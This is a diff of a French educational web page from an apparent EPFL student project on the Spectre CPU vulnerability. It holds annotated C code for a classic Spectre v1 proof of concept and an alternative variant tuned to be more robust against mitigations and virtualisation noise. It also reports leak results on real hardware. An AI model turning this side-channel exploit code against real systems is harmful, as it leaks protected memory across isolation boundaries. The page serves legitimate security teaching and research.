@@ -31,54 +31,71 @@
 
 <div class="page-hero">
   <div class="container">
-    <div class="section-tag">Vulnérabilité CVE-2017-5753</div>
-    <h1>L'attaque <span style="color:var(--accent);">Spectre</span> v1</h1>
-    <p>Mécanisme complet, code vulnérable annoté, scénario d'attaque pas à pas.</p>
+    <div class="section-tag">CVE-2017-5753 · CVE-2017-5715</div>
+    <h1>L'attaque <span style="color:var(--accent);">Spectre</span></h1>
+    <p>Deux approches expérimentales : le PoC classique Variant 1 (Kocher et al. 2018) et un PoC alternatif plus robuste testé sur hardware réel.</p>
   </div>
 </div>
 
-<!-- OVERVIEW -->
+<!-- SWITCHER PoC -->
+<div style="position:sticky;top:58px;z-index:90;background:rgba(10,10,15,0.97);backdrop-filter:blur(20px);border-bottom:1px solid rgba(255,255,255,0.07);padding:12px 24px;display:flex;align-items:center;justify-content:space-between;gap:16px;">
+  <span style="font-family:var(--font-mono);font-size:11px;letter-spacing:.15em;text-transform:uppercase;color:#7878a0;">Approches expérimentales</span>
+  <div style="display:flex;background:rgba(26,26,36,1);border:1px solid rgba(255,255,255,0.07);border-radius:100px;padding:4px;gap:4px;">
+    <button id="btn-v1" onclick="switchPoc('v1')" style="padding:7px 18px;border-radius:100px;border:none;cursor:pointer;font-family:var(--font-mono);font-size:11px;font-weight:700;transition:all .25s;background:rgba(255,68,68,0.15);color:#ff4444;">
+      PoC V1 · Classique
+    </button>
+    <button id="btn-v2" onclick="switchPoc('v2')" style="padding:7px 18px;border-radius:100px;border:none;cursor:pointer;font-family:var(--font-mono);font-size:11px;font-weight:700;transition:all .25s;background:transparent;color:#7878a0;">
+      PoC V2 · Alternatif
+    </button>
+  </div>
+</div>
+
+<!-- ════════════════════════════════
+     POC V1
+════════════════════════════════ -->
+<div id="panel-v1">
+
+<!-- OVERVIEW V1 -->
 <section>
   <div class="container">
     <div class="section-header">
-      <div class="section-tag">Vue d'ensemble</div>
-      <h2>Spectre en trois phases</h2>
-      <p>Spectre v1 combine prédiction de branchement, exécution spéculative hors limites, et Flush+Reload pour exfiltrer des données normalement inaccessibles.</p>
+      <div class="section-tag">Spectre Variant 1 — CVE-2017-5753</div>
+      <h2>Le PoC classique — Kocher et al. 2018</h2>
+      <p>L'approche originale publiée par les chercheurs de Google Project Zero. Exploite la prédiction de branchement et le canal Flush+Reload. Référence académique standard.</p>
     </div>
 
     <div class="cards-grid" style="margin-bottom:40px;">
       <div class="card">
         <div class="card-icon blue" style="font-size:22px;">🎓</div>
         <h3>Phase 1 — Entraînement</h3>
-        <p>Appeler la fonction vulnérable avec des entrées <em>valides</em> (x &lt; array1_size) pour que le Branch Predictor Unit (BPU) apprenne à prédire "branche prise".</p>
+        <p>Appeler la fonction victime avec des entrées <em>valides</em> (x &lt; array1_size) pour que le Branch Predictor Unit apprenne à prédire "branche prise".</p>
       </div>
       <div class="card">
         <div class="card-icon red" style="font-size:22px;">👻</div>
         <h3>Phase 2 — Exploitation</h3>
-        <p>Appeler avec x hors-limites (pointant vers un secret). Le BPU prédit encore "pris" → spéculation → accès hors-limites → secret chargé en cache.</p>
+        <p>Flusher <code>array1_size</code> du cache, appeler avec x hors-limites. Le BPU prédit "pris" → spéculation → accès hors-limites → secret chargé dans le probe array.</p>
       </div>
       <div class="card">
         <div class="card-icon green" style="font-size:22px;">📡</div>
         <h3>Phase 3 — Exfiltration</h3>
-        <p>Utiliser Flush+Reload pour mesurer quel index du tableau de sonde est en cache. L'index chaud = la valeur du secret.</p>
+        <p>Mesurer quel index du probe array est en cache (Flush+Reload). L'index le plus rapide d'accès révèle la valeur du secret.</p>
       </div>
     </div>
 
-    <!-- FULL CODE -->
-    <div class="section-divider">Code vulnérable complet (Spectre v1)</div>
+    <div class="section-divider">Code vulnérable annoté (Spectre v1)</div>
     <div class="code-block">
 <span class="line"><span class="comment">/* ══ VARIABLES VICTIMES ══════════════════════════════════════════════════ */</span></span>
 <span class="line"><span class="type">unsigned int</span>  array1_size = <span class="num">16</span>;</span>
-<span class="line"><span class="type">uint8_t</span>       array1[<span class="num">160</span>];                   <span class="comment">// tableau d'accès légitimes</span></span>
-<span class="line"><span class="type">uint8_t</span>       array2[<span class="num">256</span> * <span class="num">512</span>];             <span class="comment">// tableau de sonde (probe array)</span></span>
-<span class="line"><span class="type">char</span>          secret[] = <span class="str">"Mon secret EPFL"</span>;  <span class="comment">// valeur à exfiltrer</span></span>
+<span class="line"><span class="type">uint8_t</span>       array1[<span class="num">160</span>];                    <span class="comment">// tableau d'accès légitimes</span></span>
+<span class="line"><span class="type">uint8_t</span>       array2[<span class="num">256</span> * <span class="num">512</span>];              <span class="comment">// probe array (canal auxiliaire)</span></span>
+<span class="line"><span class="type">char</span>          secret[] = <span class="str">"EPFL_SECRET_42"</span>;   <span class="comment">// valeur à exfiltrer</span></span>
 <span class="line"></span>
 <span class="line"><span class="comment">/* ══ FONCTION VICTIME ════════════════════════════════════════════════════ */</span></span>
 <span class="line"><span class="type">void</span> <span class="fn">victim_function</span>(<span class="type">size_t</span> x) {</span>
-<span class="line">    <span class="keyword">if</span> (x &lt; array1_size) {                  <span class="comment">// ① garde de sécurité</span></span>
-<span class="line">        <span class="type">uint8_t</span> val = array1[x];              <span class="comment">// ② accès tableau</span></span>
-<span class="line">        <span class="type">volatile</span> y = array2[val * <span class="num">512</span>];       <span class="comment">// ③ encodage canal auxiliaire</span></span>
-<span class="line">    }                                         <span class="comment">// ← Si spéculatif : val = secret !</span></span>
+<span class="line">    <span class="keyword">if</span> (x &lt; array1_size) {                   <span class="comment">// ① garde de sécurité</span></span>
+<span class="line">        <span class="type">uint8_t</span> val = array1[x];               <span class="comment">// ② accès tableau</span></span>
+<span class="line">        <span class="type">volatile</span> y = array2[val * <span class="num">512</span>];        <span class="comment">// ③ encodage canal — val = secret si spéculatif !</span></span>
+<span class="line">    }</span>
 <span class="line">}</span>
 <span class="line"></span>
 <span class="line"><span class="comment">/* ══ CODE ATTAQUANT ══════════════════════════════════════════════════════ */</span></span>
@@ -87,103 +104,271 @@
 <span class="line">    <span class="fn">victim_function</span>(i % array1_size);</span>
 <span class="line"></span>
 <span class="line"><span class="comment">// PHASE 2 : Exécution malveillante</span></span>
-<span class="line">x_malveillant = (<span class="type">size_t</span>)(secret - (<span class="type">char</span>*)array1); <span class="comment">// offset vers le secret</span></span>
-<span class="line"><span class="fn">_mm_clflush</span>(&amp;array1_size);                        <span class="comment">// rendre la garde lente</span></span>
-<span class="line"><span class="fn">victim_function</span>(x_malveillant);                    <span class="comment">// → spéculation !</span></span>
+<span class="line">x_mal = (<span class="type">size_t</span>)(secret - (<span class="type">char</span>*)array1);    <span class="comment">// offset vers le secret</span></span>
+<span class="line"><span class="fn">_mm_clflush</span>(&amp;array1_size);                    <span class="comment">// rendre la garde lente (~200 cycles)</span></span>
+<span class="line"><span class="fn">victim_function</span>(x_mal);                       <span class="comment">// → fenêtre spéculative !</span></span>
 <span class="line"></span>
-<span class="line"><span class="comment">// PHASE 3 : Flush+Reload pour lire le cache</span></span>
+<span class="line"><span class="comment">// PHASE 3 : Flush+Reload</span></span>
 <span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="num">0</span>; i &lt; <span class="num">256</span>; i++) {</span>
-<span class="line">    t = <span class="fn">rdtscp_latency</span>(&amp;array2[i * <span class="num">512</span>]);</span>
-<span class="line">    <span class="keyword">if</span> (t &lt; THRESHOLD) leaked_value = i;           <span class="comment">// hit → secret !</span></span>
+<span class="line">    t = <span class="fn">rdtsc_latency</span>(&amp;array2[i * <span class="num">512</span>]);</span>
+<span class="line">    <span class="keyword">if</span> (t &lt; THRESHOLD) leaked_value = i;       <span class="comment">// cache hit → secret révélé</span></span>
 <span class="line">}</span>
     </div>
   </div>
 </section>
 
-<!-- DETAILED STEPS -->
+<!-- ANALYSE V1 -->
 <section class="alt">
   <div class="container">
     <div class="section-header">
       <div class="section-tag">Analyse détaillée</div>
-      <h2>Pourquoi la garde de sécurité est inutile</h2>
+      <h2>Pourquoi la garde de sécurité est contournée</h2>
     </div>
 
     <div class="prose">
-      <p>
-        La ligne <code style="font-family:var(--font-mono);font-size:12px;color:var(--blue);">if (x &lt; array1_size)</code> est censée protéger contre les accès hors-limites. Mais le processeur <em>ne connaît pas encore</em> la valeur de <code style="font-family:var(--font-mono);font-size:12px;color:var(--blue);">array1_size</code> quand il commence à spéculer.
-      </p>
-      <p>
-        L'astuce clé de l'attaquant : <strong>vider <code style="font-family:var(--font-mono);font-size:12px;">array1_size</code> du cache</strong> avec <code style="font-family:var(--font-mono);font-size:12px;color:var(--blue);">clflush(&amp;array1_size)</code>. Maintenant le chargement de <code style="font-family:var(--font-mono);font-size:12px;">array1_size</code> prend ~200 cycles. Pendant ces 200 cycles, le processeur spécule sur la base de sa prédiction — et exécute le corps du if avec x hors-limites.
-      </p>
-      <p>
-        Quand le résultat de <code style="font-family:var(--font-mono);font-size:12px;">array1_size</code> arrive enfin et que la condition est évaluée comme fausse, l'exécution spéculative est annulée. Mais <code style="font-family:var(--font-mono);font-size:12px;color:var(--accent);">array2[secret_value * 512] est déjà en cache.</code>
-      </p>
+      <p>La ligne <code style="font-family:var(--font-mono);font-size:12px;color:var(--blue);">if (x &lt; array1_size)</code> est censée protéger contre les accès hors-limites. Mais le processeur <em>ne connaît pas encore</em> la valeur de <code style="font-family:var(--font-mono);font-size:12px;color:var(--blue);">array1_size</code> quand il commence à spéculer.</p>
+      <p>L'astuce clé : <strong>flusher <code style="font-family:var(--font-mono);font-size:12px;">array1_size</code> du cache</strong> avec <code style="font-family:var(--font-mono);font-size:12px;color:var(--blue);">clflush</code>. Le chargement de <code style="font-family:var(--font-mono);font-size:12px;">array1_size</code> prend alors ~200 cycles au lieu de ~4. Pendant ces 200 cycles, le processeur spécule et exécute le corps du if avec x hors-limites.</p>
+      <p>Quand <code style="font-family:var(--font-mono);font-size:12px;">array1_size</code> arrive enfin et que la condition est fausse, la spéculation est annulée architecturalement — mais <code style="font-family:var(--font-mono);font-size:12px;color:var(--accent);">array2[secret * 512] reste en cache.</code></p>
     </div>
 
     <div class="alert warning" style="margin-top:24px;">
-      <div class="alert-title">⚠ Timing Attack sur array1_size</div>
-      En flushant array1_size, l'attaquant crée une fenêtre de spéculation artificielle. Plus la latence de chargement est grande, plus la fenêtre est large, et plus l'exécution spéculative avance loin dans le code hors-limites.
+      <div class="alert-title">⚠ Résultat expérimental — PoC V1 sur hardware moderne</div>
+      Testé sur Intel i5-8350U (Kaby Lake R) sous Linux 6.17 avec mitigations actives : <strong>0/14 bytes corrects</strong>. Les mitigations IBRS + usercopy/swapgs bloquent totalement ce PoC. Sur Linux avec mitigations désactivées : même résultat — le CPU i5-8350U utilise <code>clflushopt</code> asynchrone qui rend le canal Flush+Reload classique inopérant sur ce matériel.
     </div>
   </div>
 </section>
 
-<!-- SCENARIO -->
+<!-- RÉSULTATS V1 -->
 <section>
   <div class="container">
     <div class="section-header">
-      <div class="section-tag">Scénario concret</div>
-      <h2>Exfiltration octet par octet</h2>
+      <div class="section-tag">Résultats expérimentaux</div>
+      <h2>PoC V1 — Chiffres réels</h2>
+    </div>
+    <div class="stat-grid">
+      <div class="stat-card">
+        <strong style="color:var(--accent);">0/14</strong>
+        <span>bytes corrects · Linux patché</span>
+      </div>
+      <div class="stat-card">
+        <strong style="color:var(--accent);">0/15</strong>
+        <span>bytes corrects · WSL2</span>
+      </div>
+      <div class="stat-card">
+        <strong style="color:var(--orange);">clflushopt</strong>
+        <span>cause de l'échec sur i5-8350U</span>
+      </div>
+      <div class="stat-card">
+        <strong style="color:var(--blue);">8/8</strong>
+        <span>Flush+Reload isolé · WSL2 ✓</span>
+      </div>
+    </div>
+    <div class="prose" style="margin-top:24px;">
+      <p>L'échec du PoC V1 sur hardware moderne est lui-même un résultat scientifique : il confirme l'efficacité des mitigations déployées depuis 2018. Le canal cache reste physiquement mesurable (ratio hit/miss de 5 à 8×), mais la fenêtre spéculative est trop étroite pour être exploitée avec cette technique.</p>
+    </div>
+  </div>
+</section>
+
+</div>
+
+<!-- ════════════════════════════════
+     POC V2
+════════════════════════════════ -->
+<div id="panel-v2" style="display:none;">
+
+<!-- OVERVIEW V2 -->
+<section>
+  <div class="container">
+    <div class="section-header">
+      <div class="section-tag">PoC Alternatif — Approche robuste</div>
+      <h2>Un PoC plus résistant aux mitigations</h2>
+      <p>Face à l'échec du PoC V1 sur hardware moderne, nous avons développé une approche alternative qui contourne certaines limitations — notamment le bruit de virtualisation WSL et la sensibilité aux mitigations kernel.</p>
     </div>
 
-    <div class="prose">
-      <p>
-        En répétant l'attaque pour chaque octet du secret (en faisant varier x_malveillant), l'attaquant peut exfiltrer un secret de longueur arbitraire. Dans la pratique, on répète chaque byte ~1000 fois et on prend la valeur avec le plus grand nombre de hits.
-      </p>
+    <div class="cards-grid" style="margin-bottom:40px;">
+      <div class="card">
+        <div class="card-icon blue" style="font-size:22px;">🔄</div>
+        <h3>Flush de condition</h3>
+        <p>Au lieu de flusher <code>array1_size</code>, on flushe une variable <code>condition</code> booléenne. Technique plus robuste face aux mitigations kernel qui ciblent spécifiquement les gardes de borne.</p>
+      </div>
+      <div class="card">
+        <div class="card-icon red" style="font-size:22px;">📐</div>
+        <h3>Probe array 1 MB</h3>
+        <p>256 pages × 4 KiB = 1 MB — chaque entrée sur une page mémoire différente. Résiste mieux au hardware prefetcher qu'un tableau de 128 KiB.</p>
+      </div>
+      <div class="card">
+        <div class="card-icon green" style="font-size:22px;">📊</div>
+        <h3>Minimum + vote majoritaire</h3>
+        <p>Mesure par minimum de latence sur 100 rounds (au lieu de comptage de hits). Vote majoritaire sur 12 répétitions pour filtrer le bruit.</p>
+      </div>
     </div>
 
-    <div class="code-block" style="margin-top:20px;">
-<span class="line"><span class="comment">/* Exfiltration de 'n' octets à partir de 'target_addr' */</span></span>
-<span class="line"><span class="keyword">for</span> (<span class="type">int</span> byte_idx = <span class="num">0</span>; byte_idx &lt; n; byte_idx++) {</span>
-<span class="line">    <span class="type">int</span> results[<span class="num">256</span>] = {<span class="num">0</span>};</span>
+    <div class="section-divider">Code du PoC alternatif (spectre_poc.c)</div>
+    <div class="code-block">
+<span class="line"><span class="comment">/* ══ CONFIGURATION ══════════════════════════════════════════════════════ */</span></span>
+<span class="line"><span class="preprocessor">#define</span> KB4         <span class="num">4096</span>          <span class="comment">// stride = 1 page mémoire</span></span>
+<span class="line"><span class="preprocessor">#define</span> PROBE_PAGES <span class="num">256</span>           <span class="comment">// 256 entrées possibles (1 byte)</span></span>
+<span class="line"><span class="preprocessor">#define</span> PROBE_SIZE  (KB4 * <span class="num">256</span>)  <span class="comment">// 1 MB total → chaque entrée sur une page</span></span>
+<span class="line"><span class="preprocessor">#define</span> ROUNDS      <span class="num">100</span>           <span class="comment">// répétitions par byte</span></span>
+<span class="line"><span class="preprocessor">#define</span> REPEAT      <span class="num">12</span>            <span class="comment">// vote majoritaire</span></span>
 <span class="line"></span>
-<span class="line">    <span class="keyword">for</span> (<span class="type">int</span> trial = <span class="num">0</span>; trial &lt; <span class="num">1000</span>; trial++) {</span>
-<span class="line">        <span class="fn">flush_probe_array</span>();                         <span class="comment">// Flush</span></span>
-<span class="line">        <span class="fn">train_branch_predictor</span>(array1_size);         <span class="comment">// Train</span></span>
-<span class="line">        <span class="fn">_mm_clflush</span>(&amp;array1_size);                   <span class="comment">// Slow down guard</span></span>
-<span class="line">        <span class="fn">victim_function</span>(target_addr + byte_idx);    <span class="comment">// Exploit</span></span>
-<span class="line">        <span class="fn">reload_and_count</span>(results);                  <span class="comment">// Reload</span></span>
+<span class="line"><span class="type">volatile char</span>  *probe_buffer;    <span class="comment">// probe array 1 MB</span></span>
+<span class="line"><span class="type">volatile int</span>   *condition;       <span class="comment">// variable de contrôle flushée</span></span>
+<span class="line"><span class="type">volatile int</span>    valid_address = <span class="num">5</span>;</span>
+<span class="line"></span>
+<span class="line"><span class="comment">/* ══ FONCTION VICTIME ════════════════════════════════════════════════════ */</span></span>
+<span class="line"><span class="type">static void</span> <span class="fn">victim_function</span>(<span class="type">size_t</span> target_addr) {</span>
+<span class="line">    <span class="keyword">if</span> (*condition) {                                      <span class="comment">// condition flushée</span></span>
+<span class="line">        <span class="comment">/* accès spéculatif — lit la mémoire à target_addr */</span></span>
+<span class="line">        *(probe_buffer + (*(volatile char*)target_addr) * KB4);</span>
 <span class="line">    }</span>
+<span class="line">}</span>
 <span class="line"></span>
-<span class="line">    <span class="type">int</span> best = <span class="fn">argmax</span>(results);</span>
-<span class="line">    <span class="fn">printf</span>(<span class="str">"byte[%d] = 0x%02x ('%c')\n"</span>, byte_idx, best, best);</span>
+<span class="line"><span class="comment">/* ══ LECTURE D'UN BYTE ═══════════════════════════════════════════════════ */</span></span>
+<span class="line"><span class="type">char</span> <span class="fn">read_byte</span>(<span class="type">size_t</span> addr) {</span>
+<span class="line">    <span class="type">int</span> mins[<span class="num">256</span>]; <span class="comment">// minimum de latence par index</span></span>
+<span class="line"></span>
+<span class="line">    <span class="keyword">for</span> (<span class="type">int</span> r = <span class="num">0</span>; r &lt; ROUNDS; r++) {</span>
+<span class="line">        <span class="fn">memcpy</span>(tmp, secret, <span class="num">50</span>);              <span class="comment">// charge le cache légitimement</span></span>
+<span class="line"></span>
+<span class="line">        *condition = <span class="num">1</span>;</span>
+<span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="num">0</span>; i &lt; <span class="num">100</span>; i++)         <span class="comment">// entraîne le prédicteur</span></span>
+<span class="line">            <span class="fn">victim_function</span>(&amp;valid_address);</span>
+<span class="line"></span>
+<span class="line">        <span class="fn">flush</span>(&amp;probe_buffer[valid_address * KB4]);</span>
+<span class="line">        *condition = <span class="num">0</span>;                        <span class="comment">// arme le gadget</span></span>
+<span class="line">        <span class="fn">flush</span>(condition);                      <span class="comment">// rend la vérification lente</span></span>
+<span class="line">        <span class="fn">_mm_mfence</span>();</span>
+<span class="line"></span>
+<span class="line">        <span class="fn">victim_function</span>(addr);                <span class="comment">// → spéculation avec target_addr !</span></span>
+<span class="line"></span>
+<span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="num">0</span>; i &lt; <span class="num">256</span>; i++) {</span>
+<span class="line">            <span class="type">int</span> t = <span class="fn">time_access</span>(&amp;probe_buffer[i * KB4]);</span>
+<span class="line">            <span class="keyword">if</span> (t &lt; mins[i]) mins[i] = t;     <span class="comment">// garde le minimum</span></span>
+<span class="line">            <span class="fn">flush</span>(&amp;probe_buffer[i * KB4]);</span>
+<span class="line">        }</span>
+<span class="line">    }</span>
+<span class="line">    <span class="keyword">return</span> (<span class="type">char</span>) <span class="fn">argmin</span>(mins);             <span class="comment">// index le plus rapide = secret</span></span>
 <span class="line">}</span>
     </div>
+  </div>
+</section>
 
-    <div class="stat-grid" style="margin-top:32px;">
+<!-- DIFFÉRENCES V1 vs V2 -->
+<section class="alt">
+  <div class="container">
+    <div class="section-header">
+      <div class="section-tag">Comparaison</div>
+      <h2>PoC V1 vs PoC V2 — Différences clés</h2>
+    </div>
+    <div style="overflow-x:auto;">
+      <table style="width:100%;border-collapse:collapse;font-family:var(--font-mono);font-size:13px;">
+        <thead>
+          <tr style="border-bottom:1px solid rgba(255,255,255,0.07);">
+            <th style="text-align:left;padding:12px 16px;color:#7878a0;font-size:10px;letter-spacing:.1em;text-transform:uppercase;">Aspect</th>
+            <th style="text-align:left;padding:12px 16px;color:#7878a0;font-size:10px;letter-spacing:.1em;text-transform:uppercase;">PoC V1 (Kocher)</th>
+            <th style="text-align:left;padding:12px 16px;color:#7878a0;font-size:10px;letter-spacing:.1em;text-transform:uppercase;">PoC V2 (alternatif)</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
+            <td style="padding:11px 16px;color:#7878a0;">Variable flushée</td>
+            <td style="padding:11px 16px;color:#e8e8f0;"><code style="color:#facc15;">array1_size</code></td>
+            <td style="padding:11px 16px;color:#e8e8f0;"><code style="color:#22c55e;">condition</code></td>
+          </tr>
+          <tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
+            <td style="padding:11px 16px;color:#7878a0;">Taille probe array</td>
+            <td style="padding:11px 16px;color:#e8e8f0;">256 × 512 B = 128 KiB</td>
+            <td style="padding:11px 16px;color:#e8e8f0;color:#22c55e;">256 × 4096 B = 1 MB</td>
+          </tr>
+          <tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
+            <td style="padding:11px 16px;color:#7878a0;">Méthode de mesure</td>
+            <td style="padding:11px 16px;color:#e8e8f0;">Comptage de hits (threshold)</td>
+            <td style="padding:11px 16px;color:#e8e8f0;color:#22c55e;">Minimum de latence</td>
+          </tr>
+          <tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
+            <td style="padding:11px 16px;color:#7878a0;">Débruitage</td>
+            <td style="padding:11px 16px;color:#e8e8f0;">Aucun</td>
+            <td style="padding:11px 16px;color:#e8e8f0;color:#22c55e;">Vote majoritaire 12 répétitions</td>
+          </tr>
+          <tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
+            <td style="padding:11px 16px;color:#7878a0;">Résultat WSL2</td>
+            <td style="padding:11px 16px;color:#ff4444;">0/15 bytes ✗</td>
+            <td style="padding:11px 16px;color:#22c55e;">25/25 chars ✓ (meilleure run)</td>
+          </tr>
+          <tr style="border-bottom:1px solid rgba(255,255,255,0.04);">
+            <td style="padding:11px 16px;color:#7878a0;">Résultat Linux sans mit.</td>
+            <td style="padding:11px 16px;color:#ff4444;">0/14 bytes ✗ (clflushopt)</td>
+            <td style="padding:11px 16px;color:#22c55e;">20/25 chars ✓ (meilleure run)</td>
+          </tr>
+          <tr>
+            <td style="padding:11px 16px;color:#7878a0;">Résultat Linux patché</td>
+            <td style="padding:11px 16px;color:#ff4444;">0/14 bytes ✗</td>
+            <td style="padding:11px 16px;color:#ff4444;">N/A — mitigations bloquent</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- RÉSULTATS V2 -->
+<section>
+  <div class="container">
+    <div class="section-header">
+      <div class="section-tag">Résultats expérimentaux</div>
+      <h2>PoC V2 — Chiffres réels sur hardware</h2>
+    </div>
+    <div class="stat-grid">
       <div class="stat-card">
-        <strong style="color:var(--blue);">~1000</strong>
-        <span>itérations par octet</span>
+        <strong style="color:var(--green);">25/25</strong>
+        <span>chars · WSL2 meilleure run</span>
       </div>
       <div class="stat-card">
-        <strong style="color:var(--green);">~99%</strong>
-        <span>taux de succès typique</span>
+        <strong style="color:var(--green);">20/25</strong>
+        <span>chars · Linux sans mit. best run</span>
       </div>
       <div class="stat-card">
-        <strong style="color:var(--orange);">~ms</strong>
-        <span>par octet extrait</span>
+        <strong style="color:var(--blue);">~18/25</strong>
+        <span>moyenne [Slow] · WSL2</span>
       </div>
       <div class="stat-card">
-        <strong style="color:var(--accent);">illimité</strong>
-        <span>longueur exfiltrable</span>
+        <strong style="color:var(--orange);">~5/25</strong>
+        <span>moyenne · Linux sans mit.</span>
       </div>
+    </div>
+
+    <div class="alert warning" style="margin-top:28px;">
+      <div class="alert-title">⚠ Contexte important</div>
+      Le PoC V2 fonctionne sous WSL2 malgré les mitigations actives car il exploite une fenêtre spéculative différente de celle ciblée par IBRS/usercopy. Sur Linux patché il reste bloqué — les mitigations Intel sont suffisamment larges pour couvrir cette approche aussi. Sur Linux <em>sans</em> mitigations, la fuite est clairement observable et reproductible.
+    </div>
+
+    <div class="section-divider" style="margin-top:36px;">Sortie typique — mode [Slow] · WSL2</div>
+    <div class="code-block" style="font-family:var(--font-mono);font-size:13px;line-height:1.9;">
+<span class="line" style="color:#22c55e;">[Slow] Secret = TestStringLeakedBySpectre  ← run 3 · 25/25 ✓</span>
+<span class="line" style="color:#22c55e;">[Slow] Secret = TestStringLeaedBySectre    ← run 2 · 23/25</span>
+<span class="line" style="color:#facc15;">[Fast] Secret = Tsttiga·XdBóp·ectr         ← run 1 · bruité</span>
+<span class="line" style="color:#22c55e;">[Slow] Secret = TestStringLeakedBySpectre  ← run 4 · 25/25 ✓</span>
+<span class="line" style="color:#7878a0;">[Fast] Secret = TVnttx|·cKke·By···re       ← run 5 · bruité</span>
+    </div>
+
+    <div class="section-divider" style="margin-top:36px;">Sortie typique — Linux sans mitigations</div>
+    <div class="code-block" style="font-family:var(--font-mono);font-size:13px;line-height:1.9;">
+<span class="line" style="color:#facc15;">[Fast] RUN 11 : Te·tSt·ing·eakedBySp·····   ← 17/25</span>
+<span class="line" style="color:#facc15;">[Fast] RUN 12 : T··tS···>·p···edBySpectre    ← 14/25</span>
+<span class="line" style="color:#22c55e;">[Fast] RUN 20 : T·k·StringLeakedBySpecQ·e   ← 20/25 ★ meilleure run</span>
+<span class="line" style="color:#7878a0;">Moyenne Fast : 4.95/25 · Moyenne Slow : 4.35/25</span>
     </div>
 
     <div style="margin-top:40px;display:flex;gap:12px;flex-wrap:wrap;">
       <a href="barriers.html" class="btn btn-primary">Suivant : Barrières & Protections →</a>
       <a href="flush-reload.html" class="btn btn-ghost">← Flush+Reload</a>
+      <a href="results.html" class="btn btn-ghost">Voir tous les résultats →</a>
     </div>
   </div>
 </section>
+
+</div>
 
 <footer>
   <strong>Projet Bachelor · EPFL · Printemps 2026</strong> &nbsp;·&nbsp;
@@ -194,6 +379,15 @@
 document.getElementById('nav-toggle').addEventListener('click', () => {
   document.getElementById('nav-links').classList.toggle('open');
 });
+
+function switchPoc(poc) {
+  document.getElementById('panel-v1').style.display = poc === 'v1' ? 'block' : 'none';
+  document.getElementById('panel-v2').style.display = poc === 'v2' ? 'block' : 'none';
+  document.getElementById('btn-v1').style.background = poc === 'v1' ? 'rgba(255,68,68,0.15)' : 'transparent';
+  document.getElementById('btn-v1').style.color = poc === 'v1' ? '#ff4444' : '#7878a0';
+  document.getElementById('btn-v2').style.background = poc === 'v2' ? 'rgba(34,197,94,0.12)' : 'transparent';
+  document.getElementById('btn-v2').style.color = poc === 'v2' ? '#22c55e' : '#7878a0';
+}
 </script>
 
 </body>
